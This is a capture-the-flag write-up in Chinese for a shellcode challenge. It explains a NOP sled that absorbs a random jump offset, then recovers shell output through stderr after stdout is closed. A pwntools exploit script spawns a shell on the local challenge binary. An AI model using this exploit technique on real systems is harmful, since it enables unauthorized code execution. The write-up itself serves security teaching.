# 随便乱搞的 shellcode

## 题目简述

程序在固定地址 `0x20230000` 映射一页可读、可写、可执行内存，并允许写入 `0x100` 字节 shellcode。执行前入口会随机增加 `0` 到 `0xff` 的偏移，同时关闭标准输出文件描述符 1，因此需要同时解决随机落点和 shell 无输出的问题。

## 解题过程

在 256 字节输入区前部填充 `NOP`，把真正的 shellcode 右对齐放在末尾。无论随机偏移落在 `0x20230000` 到 `0x202300ff` 的哪个位置，CPU 都会沿 NOP sled 向后执行并最终进入 shellcode。需要保证 shellcode 自身长度不超过 `0x100`。

程序只执行了 `close(1)`，标准错误 2 仍然可用。拿到 shell 后执行 `exec 1>&2`，让当前 shell 的标准输出重定向到标准错误，后续命令结果即可在连接中显示。

```python
from pwn import *

context(arch="amd64", os="linux")
io = process("../dist/ret2shellcode")

sc = asm(shellcraft.sh())
payload = sc.rjust(0x100, b"\x90")
io.sendafter(b"code:\n", payload)
io.sendline(b"exec 1>&2")
io.interactive()
```

## 方法总结

NOP sled 可以容忍一定范围内的不精确跳转地址，但前提是整个可能入口区都能自然滑向有效载荷。文件描述符被关闭时，应检查其他仍打开的通道；本题使用 stderr 恢复可见输出，比依赖通常只读的 stdin 更稳定。
